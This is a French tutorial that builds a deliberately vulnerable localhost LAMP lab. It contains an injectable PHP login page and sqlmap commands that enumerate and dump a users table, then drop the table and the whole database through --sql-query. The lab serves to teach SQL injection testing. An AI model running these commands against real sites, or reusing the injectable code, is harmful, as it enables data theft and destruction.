# 🧨 **PARTIE 07 – Hors-Série : Simulation d’une Attaque SQL Injection avec sqlmap sur une Base de Données MySQL Non Sécurisée**


1. Création d’un environnement vulnérable avec MySQL non sécurisé  
2. Page PHP injectable  
3. Toutes les **commandes sqlmap** pour :
   - Découvrir les bases de données
   - Explorer les tables
   - Extraire les données (dump)
   - Supprimer des bases de données ou des tables via sqlmap (en mode test)

---

# 🧨 PARTIE 7 – Hors-Série : Attaque d’une base de données non sécurisée avec sqlmap

---

## 🔧 ÉTAPE 1 – Créer un environnement vulnérable

### 📦 Installer le stack LAMP non sécurisé
```bash
sudo apt update
sudo apt install apache2 mysql-server php php-mysql libapache2-mod-php -y
```

⚠️ **NE PAS sécuriser MySQL** :  
Ne pas lancer `mysql_secure_installation`

---

### 🗃️ Créer une base de données vulnérable

```bash
sudo mysql -u root

CREATE DATABASE testdb;
USE testdb;

CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50),
  password VARCHAR(50)
);

INSERT INTO users (username, password) VALUES 
('admin', 'admin123'),
('jean', 'pass1234'),
('root', 'toor'),
('alice', '123456');

EXIT;
```

---

## 🧑‍💻 ÉTAPE 2 – Créer une page PHP vulnérable à l'injection SQL

### 📁 Fichier : `/var/www/html/login.php`
```php
<?php
$mysqli = new mysqli("localhost", "root", "", "testdb");
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}

$user = $_GET['user'];
$pass = $_GET['pass'];

$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$result = $mysqli->query($sql);

if ($result->num_rows > 0) {
    echo "Logged in successfully!";
} else {
    echo "Login failed.";
}
?>
```

➡️ Accessible à :  
`http://localhost/login.php?user=admin&pass=admin123`

---

## 🧪 ÉTAPE 3 – Exploiter la faille avec **sqlmap**

### ✅ Tester si la cible est vulnérable

```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" --batch --risk=3 --level=5
```

---

### 📂 Lister les bases de données :

```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" --dbs
```

---

### 🗂️ Lister les tables de `testdb` :

```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" -D testdb --tables
```

---

### 📑 Lister les colonnes de la table `users` :

```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" -D testdb -T users --columns
```

---

### 📤 Dumper tout le contenu de `testdb.users` :

```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" -D testdb -T users --dump
```

---

## 💥 ÉTAPE 4 – Supprimer la base ou une table avec **sqlmap**

> ⚠️ Sqlmap ne fournit pas directement une commande "drop database", mais tu peux **exécuter une requête SQL arbitraire** avec `--sql-query`.

### 🗑️ Supprimer une table :
```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" --sql-query="DROP TABLE testdb.users"
```

### ☠️ Supprimer une base entière :
```bash
sqlmap -u "http://localhost/login.php?user=admin&pass=admin123" --sql-query="DROP DATABASE testdb"
```

✅ Ces commandes **suppriment réellement** les données sur le serveur MySQL.

---

## ✅ Résumé des commandes sqlmap

| Action                                 | Commande                                                                 |
|----------------------------------------|--------------------------------------------------------------------------|
| Vérifier vulnérabilité                 | `sqlmap -u "URL" --batch --risk=3 --level=5`                             |
| Lister les bases                       | `sqlmap -u "URL" --dbs`                                                  |
| Lister les tables d'une base           | `sqlmap -u "URL" -D testdb --tables`                                     |
| Lister les colonnes d'une table        | `sqlmap -u "URL" -D testdb -T users --columns`                           |
| Dumper une table                       | `sqlmap -u "URL" -D testdb -T users --dump`                              |
| Supprimer une table                    | `sqlmap -u "URL" --sql-query="DROP TABLE testdb.users"`                  |
| Supprimer une base                     | `sqlmap -u "URL" --sql-query="DROP DATABASE testdb"`                     |

---

## 🧹 ÉTAPE 5 – Nettoyage de l’environnement

```bash
sudo systemctl stop apache2
sudo systemctl stop mysql
sudo rm -rf /var/www/html/*
sudo apt remove apache2 mysql-server php php-mysql libapache2-mod-php -y
sudo apt autoremove -y
```
